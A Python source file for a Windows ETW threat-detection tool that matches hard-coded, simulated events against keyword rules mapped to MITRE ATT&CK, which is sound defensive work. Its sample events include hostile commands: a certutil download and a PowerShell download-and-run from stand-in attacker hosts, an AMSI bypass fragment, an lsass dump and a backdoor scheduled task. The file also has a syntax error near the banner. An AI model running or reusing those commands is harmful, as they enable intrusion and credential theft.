#!/usr/bin/env python3
"""
 _____ _  _  ____  _ _   _                            
|_   _| || |/ ___|/ | \ | |                           
  | | | || |\___ \| |  \| |                           
  | | |__   _|__) | | |\  |                           
  |_|    |_||____/|_|_|_\_|__ _   _ _____    _  _____ 
   / \  | \ | |_   _|_ _/ ___| | | | ____|  / \|_   _|
  / _ \ |  \| | | |  | | |   | |_| |  _|   / _ \ | |  
 / ___ \| |\  | | |  | | |___|  _  | |___ / ___ \| |  
/_/   \_\_| \_| |_| |___\____|_| |_|_____/_/   \_\_|  

  ETW-Based Real-Time Threat Detection System
  ──────────────────────────────────────────────
  Monitors Windows kernel events via ETW providers to detect
  process injection, credential theft, LOLBins abuse, AMSI bypass,
  and suspicious PowerShell execution — all mapped to MITRE ATT&CK.

  Author  : T4S1N (eagle eye)
  ⚠️  Requires Windows + Administrator privileges.
"""

import argparse
import ctypes
import ctypes.wintypes as wt
import os
import re
import sys
import time
import threading
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime

try:
    from colorama import Fore, Style, init as ci; ci(autoreset=True); C = True
except ImportError:
    C = False

def R(t): return (Fore.RED     + t + Style.RESET_ALL) if C else t
def G(t): return (Fore.GREEN   + t + Style.RESET_ALL) if C else t
def Y(t): return (Fore.YELLOW  + t + Style.RESET_ALL) if C else t
def B(t): return (Fore.CYAN    + t + Style.RESET_ALL) if C else t
def M(t): return (Fore.MAGENTA + t + Style.RESET_ALL) if C else t
def W(t): return (Style.BRIGHT + t + Style.RESET_ALL) if C else t


# ─────────────────────────────────────────────────────────────────
# ETW Provider GUIDs (Windows Kernel Providers)
# ─────────────────────────────────────────────────────────────────
ETW_PROVIDERS = {
    "Microsoft-Windows-Kernel-Process": {
        "guid": "{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}",
        "description": "Process creation, termination, image load events",
        "events": ["ProcessStart", "ProcessStop", "ImageLoad"],
    },
    "Microsoft-Windows-Kernel-File": {
        "guid": "{EDD08927-9CC4-4E65-B970-C2560FB5C289}",
        "description": "File I/O operations",
        "events": ["FileCreate", "FileDelete", "FileRename"],
    },
    "Microsoft-Windows-DNS-Client": {
        "guid": "{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}",
        "description": "DNS resolution events",
        "events": ["DNSQuery", "DNSResponse"],
    },
    "Microsoft-Windows-PowerShell": {
        "guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
        "description": "PowerShell script block and command logging",
        "events": ["ScriptBlockLog", "CommandInvocation"],
    },
    "Microsoft-Antimalware-Scan-Interface": {
        "guid": "{2A576B87-09A7-520E-C21A-4942F0271D67}",
        "description": "AMSI scan events (script content inspection)",
        "events": ["AMSIScan", "AMSIResult"],
    },
    "Microsoft-Windows-Security-Auditing": {
        "guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
        "description": "Security audit events (logon, privilege use)",
        "events": ["LogonSuccess", "LogonFailure", "PrivilegeUse"],
    },
    "Microsoft-Windows-Sysmon": {
        "guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "description": "Sysmon extended telemetry (if installed)",
        "events": ["ProcessCreate", "NetworkConnect", "RegistryEvent"],
    },
}


# ─────────────────────────────────────────────────────────────────
# Threat Detection Rules (MITRE ATT&CK mapped)
# ─────────────────────────────────────────────────────────────────
@dataclass
class ThreatRule:
    name: str
    mitre_id: str
    severity: str           # CRITICAL, HIGH, MEDIUM, LOW
    description: str
    indicators: list = field(default_factory=list)
    etw_provider: str = ""
    detection_logic: str = ""


THREAT_RULES = [
    # Process Injection
    ThreatRule(
        name="Process Injection — Remote Thread Creation",
        mitre_id="T1055.003",
        severity="CRITICAL",
        description="CreateRemoteThread / NtCreateThreadEx called on remote process",
        indicators=["CreateRemoteThread", "NtCreateThreadEx", "RtlCreateUserThread"],
        etw_provider="Microsoft-Windows-Kernel-Process",
        detection_logic="Remote thread creation in process not matching parent",
    ),
    ThreatRule(
        name="Process Hollowing — Section Unmapping",
        mitre_id="T1055.012",
        severity="CRITICAL",
        description="NtUnmapViewOfSection followed by WriteProcessMemory",
        indicators=["NtUnmapViewOfSection", "ZwUnmapViewOfSection", "WriteProcessMemory"],
        etw_provider="Microsoft-Windows-Kernel-Process",
        detection_logic="Unmap + Write + Resume sequence on suspended process",
    ),
    ThreatRule(
        name="APC Queue Injection",
        mitre_id="T1055.004",
        severity="HIGH",
        description="QueueUserAPC targeting thread in another process",
        indicators=["QueueUserAPC", "NtQueueApcThread", "NtQueueApcThreadEx"],
        etw_provider="Microsoft-Windows-Kernel-Process",
        detection_logic="APC queued to thread in different process context",
    ),
    # Credential Access
    ThreatRule(
        name="LSASS Memory Access",
        mitre_id="T1003.001",
        severity="CRITICAL",
        description="Process accessing lsass.exe memory (credential dumping)",
        indicators=["lsass.exe", "OpenProcess", "MiniDumpWriteDump", "sekurlsa"],
        etw_provider="Microsoft-Windows-Kernel-Process",
        detection_logic="OpenProcess with PROCESS_VM_READ on lsass.exe PID",
    ),
    ThreatRule(
        name="SAM Registry Hive Access",
        mitre_id="T1003.002",
        severity="HIGH",
        description="Direct access to SAM/SECURITY/SYSTEM registry hives",
        indicators=["reg save", "HKLM\\SAM", "HKLM\\SECURITY", "HKLM\\SYSTEM"],
        etw_provider="Microsoft-Windows-Security-Auditing",
        detection_logic="Registry key access to sensitive hives",
    ),
    # LOLBins
    ThreatRule(
        name="LOLBin Execution — Living off the Land",
        mitre_id="T1218",
        severity="HIGH",
        description="Suspicious execution of LOLBin (mshta, regsvr32, certutil, etc.)",
        indicators=["mshta.exe", "regsvr32.exe", "certutil.exe", "msiexec.exe",
                     "rundll32.exe", "cmstp.exe", "wmic.exe", "wscript.exe",
                     "cscript.exe", "bitsadmin.exe", "msbuild.exe"],
        etw_provider="Microsoft-Windows-Kernel-Process",
        detection_logic="Known LOLBin process created with suspicious arguments",
    ),
    # PowerShell
    ThreatRule(
        name="Suspicious PowerShell — Encoded Command",
        mitre_id="T1059.001",
        severity="HIGH",
        description="PowerShell launched with -EncodedCommand or obfuscated flags",
        indicators=["-enc", "-EncodedCommand", "-ep bypass", "-nop", "IEX",
                     "Invoke-Expression", "DownloadString", "Net.WebClient",
                     "FromBase64String", "Invoke-Mimikatz"],
        etw_provider="Microsoft-Windows-PowerShell",
        detection_logic="Script block containing encoded/obfuscated commands",
    ),
    # AMSI Bypass
    ThreatRule(
        name="AMSI Bypass Attempt",
        mitre_id="T1562.001",
        severity="CRITICAL",
        description="Attempt to disable or patch AMSI (AmsiScanBuffer)",
        indicators=["AmsiScanBuffer", "amsi.dll", "AmsiInitFailed",
                     "SetProtection", "VirtualProtect"],
        etw_provider="Microsoft-Antimalware-Scan-Interface",
        detection_logic="AMSI scan returns tampered result or patch detected",
    ),
    # Persistence
    ThreatRule(
        name="Registry Run Key Persistence",
        mitre_id="T1547.001",
        severity="MEDIUM",
        description="New value added to registry Run/RunOnce keys",
        indicators=["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     "RegSetValueEx"],
        etw_provider="Microsoft-Windows-Sysmon",
        detection_logic="Registry modification to auto-start locations",
    ),
    # Scheduled Task
    ThreatRule(
        name="Scheduled Task Creation",
        mitre_id="T1053.005",
        severity="MEDIUM",
        description="New scheduled task created for persistence or execution",
        indicators=["schtasks.exe", "/create", "at.exe", "Register-ScheduledTask"],
        etw_provider="Microsoft-Windows-Kernel-Process",
        detection_logic="schtasks.exe /create with suspicious command",
    ),
    # DNS Exfiltration
    ThreatRule(
        name="Suspicious DNS — Possible Exfiltration",
        mitre_id="T1048.003",
        severity="HIGH",
        description="Abnormally long DNS queries or high-entropy subdomains",
        indicators=["dns", "TXT query", "long subdomain"],
        etw_provider="Microsoft-Windows-DNS-Client",
        detection_logic="DNS query with subdomain length > 40 or entropy > 3.5",
    ),
]


# ─────────────────────────────────────────────────────────────────
# Simulated ETW Event Monitor
# ─────────────────────────────────────────────────────────────────
@dataclass
class ETWEvent:
    timestamp: str
    provider: str
    event_type: str
    process_name: str
    pid: int
    details: str


def simulate_etw_events():
    """Generate realistic ETW event stream for demonstration."""
    events = [
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "Kernel-Process", "ProcessStart", "powershell.exe", 4812,
                 "CommandLine: powershell.exe -nop -ep bypass -enc SQBFAFgA..."),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "Kernel-Process", "ProcessStart", "rundll32.exe", 6224,
                 "CommandLine: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "Kernel-Process", "ImageLoad", "explorer.exe", 1032,
                 "ImageName: C:\\Users\\Public\\evil.dll (unsigned, high entropy)"),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "Kernel-Process", "RemoteThread", "svchost.exe", 892,
                 "SourcePID: 4812 → TargetPID: 892 (CreateRemoteThread)"),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "Kernel-Process", "ProcessStart", "certutil.exe", 7744,
                 "CommandLine: certutil.exe -urlcache -split -f http://evil.com/payload.exe"),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "DNS-Client", "DNSQuery", "chrome.exe", 3456,
                 "Query: aGVsbG8gd29ybGQgZXhmaWx0cmF0aW9u.evil-domain.com (TXT)"),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "PowerShell", "ScriptBlockLog", "powershell.exe", 4812,
                 "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')"),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "AMSI", "AMSIScan", "powershell.exe", 4812,
                 "Content: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "Kernel-Process", "ProcessStart", "lsass_dump.exe", 5500,
                 "CommandLine: procdump.exe -ma lsass.exe lsass.dmp"),
        ETWEvent(datetime.now().strftime("%H:%M:%S.%f")[:12],
                 "Kernel-Process", "ProcessStart", "schtasks.exe", 8812,
                 "CommandLine: schtasks.exe /create /tn backdoor /tr C:\\Users\\Public\\beacon.exe /sc onlogon"),
    ]
    return events


def match_events_to_rules(events: list) -> list:
    """Match ETW events against threat detection rules."""
    alerts = []
    for event in events:
        event_text = f"{event.process_name} {event.details}".lower()
        for rule in THREAT_RULES:
            matched_indicators = []
            for indicator in rule.indicators:
                if indicator.lower() in event_text:
                    matched_indicators.append(indicator)
            if matched_indicators:
                alerts.append({
                    "event": event,
                    "rule": rule,
                    "matched": matched_indicators,
                })
    return alerts


# ─────────────────────────────────────────────────────────────────
# Report Printer
# ─────────────────────────────────────────────────────────────────
def print_alert(alert: dict):
    event = alert["event"]
    rule  = alert["rule"]
    sev_colors = {"CRITICAL": R, "HIGH": Y, "MEDIUM": B, "LOW": G}
    sev_fn = sev_colors.get(rule.severity, G)

    print(f"  {sev_fn('▐')} {W(event.timestamp)}  {sev_fn(f'[{rule.severity}]')}")
    print(f"  {sev_fn('▐')} {R('⚠ ' + rule.name)}")
    print(f"  {sev_fn('▐')} MITRE: {M(rule.mitre_id)}  │  PID: {event.pid}  │  {B(event.process_name)}")
    print(f"  {sev_fn('▐')} {event.details[:80]}")
    print(f"  {sev_fn('▐')} Matched: {', '.join(Y(m) for m in alert['matched'])}")
    print(f"  {sev_fn('▐')} Logic: {rule.detection_logic}")
    print(f"  {'─' * 70}")


def print_summary(alerts: list, events: list):
    sep = "═" * 70
    print(f"\n{W(sep)}")
    print(W("  eagle eye T4S1N — Threat Detection Summary"))
    print(W(sep))
    print(f"  Events Analyzed   : {len(events)}")
    print(f"  Alerts Triggered  : {R(str(len(alerts)))}")

    severity_counts = defaultdict(int)
    mitre_counts = defaultdict(int)
    for a in alerts:
        severity_counts[a["rule"].severity] += 1
        mitre_counts[a["rule"].mitre_id] += 1

    print(f"\n  {W('[ SEVERITY BREAKDOWN ]')}")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        cnt = severity_counts.get(sev, 0)
        if cnt:
            col = {"CRITICAL": R, "HIGH": Y, "MEDIUM": B, "LOW": G}[sev]
            bar = col("█" * (cnt * 3) + "░" * (30 - cnt * 3))
            print(f"    {col(f'{sev:<10}')} [{bar}] {cnt}")

    print(f"\n  {W('[ MITRE ATT&CK COVERAGE ]')}")
    for mid, cnt in sorted(mitre_counts.items()):
        print(f"    {M(mid):<14}  {'●' * cnt}  ({cnt} alert{'s' if cnt>1 else ''})")

    # ETW Providers active
    print(f"\n  {W('[ ETW PROVIDERS ]')}")
    for name, info in ETW_PROVIDERS.items():
        print(f"    {G('●')} {W(name)}")
        print(f"      GUID: {info['guid']}")
        print(f"      {info['description']}")

    print(f"\n{W(sep)}\n")


def run_monitor(duration: int = 10):
    """Simulate real-time monitoring with event stream."""
    sep = "═" * 70
    print(f"\n{W(sep)}")
    print(W("  eagle eye T4S1N — Real-Time Threat Monitor"))
    print(W(f"  Monitoring ETW events... (duration: {duration}s)"))
    print(W(sep))

    events = simulate_etw_events()
    alerts = match_events_to_rules(events)

    print(f"\n  {W('[ LIVE EVENT STREAM ]')}")
    print(f"  {'─' * 70}")

    for i, alert in enumerate(alerts):
        time.sleep(0.5)  # Simulate real-time
        print_alert(alert)

    print_summary(alerts, events)


def banner():
    print(M("""
  ╔════════════════════════════════════════════════════════════════╗
  ║       eagle eye — ETW Real-Time Threat Detection               ║
  ║   Process · DNS · PowerShell · AMSI · LOLBins · Credentials    ║
  ║           Author: T4S1N (eagle eye)  ·                         ║
  ╚════════════════════════════════════════════════════════════════╝
""")def main():
    banner()
    parser = argparse.ArgumentParser(description="ShadowTrace — ETW-Based Real-Time Threat Detection")
    parser.add_argument("--monitor", action="store_true", help="Start real-time monitoring (simulation)")
    parser.add_argument("--duration", type=int, default=10, help="Monitor duration in seconds")
    parser.add_argument("--list-rules", action="store_true", help="List all detection rules")
    parser.add_argument("--list-providers", action="store_true", help="List ETW providers")
    args = parser.parse_args()

    if args.list_providers:
        sep = "═" * 70
        print(f"\n{W(sep)}")
        print(W("  ETW Providers Database"))
        print(W(sep))
        for name, info in ETW_PROVIDERS.items():
            print(f"  {G('●')} {W(name)}")
            print(f"    GUID   : {info['guid']}")
            print(f"    Info   : {info['description']}")
            print(f"    Events : {', '.join(info['events'])}")
            print()
        return

    if args.list_rules:
        sep = "═" * 70
        print(f"\n{W(sep)}")
        print(W("  Threat Detection Rules"))
        print(W(sep))
        for rule in THREAT_RULES:
            sev_colors = {"CRITICAL": R, "HIGH": Y, "MEDIUM": B, "LOW": G}
            col = sev_colors.get(rule.severity, G)
            print(f"  {col('●')} {W(rule.name)}")
            print(f"    MITRE    : {M(rule.mitre_id)}")
            print(f"    Severity : {col(rule.severity)}")
            print(f"    {rule.description}")
            print(f"    Provider : {rule.etw_provider}")
            print()
        return

    if args.monitor or not any([args.list_rules, args.list_providers]):
        run_monitor(args.duration)

    print(G("  [✓] ShadowTrace analysis complete.\n"))


if __name__ == "__main__":
    main()
